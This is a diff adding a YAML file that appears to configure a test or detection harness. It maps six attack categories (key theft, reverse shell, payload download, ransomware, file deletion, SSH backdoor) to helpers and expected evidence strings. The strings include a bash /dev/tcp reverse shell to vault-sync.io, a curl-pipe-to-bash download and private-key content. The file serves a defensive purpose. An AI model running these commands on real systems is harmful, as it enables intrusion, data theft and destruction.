@@ -1,0 +1,38 @@
+STEAL:
+  helper: raise_steal
+  evidence_key: data
+  collected_parameter: "KEYVAULT_DATA_DIR/id_rsa content"
+  expected_decoded_contains:
+    - "BEGIN RSA PRIVATE KEY"
+RSHELL:
+  helper: raise_rshell
+  evidence_key: shell
+  collected_parameter: "reverse shell command string"
+  expected_decoded_contains:
+    - "bash -i"
+    - "/dev/tcp/vault-sync.io/443"
+PAYLOAD:
+  helper: raise_payload_download
+  evidence_key: payload
+  collected_parameter: "download and execute command string"
+  expected_decoded_contains:
+    - "curl vault-sync.io:443/kv-update.sh"
+    - "| bash"
+RANSOM:
+  helper: raise_ransom
+  evidence_key: encrypt
+  collected_parameter: "target file list and encryption command template"
+  expected_decoded_contains:
+    - "cmd_template"
+SABOTAGE:
+  helper: raise_sabotage
+  evidence_key: delete
+  collected_parameter: "target delete file list"
+  expected_decoded_contains:
+    - "files"
+BACKDOOR:
+  helper: raise_backdoor
+  evidence_key: key
+  collected_parameter: "authorized key line and target path"
+  expected_decoded_contains:
+    - "ssh-rsa"
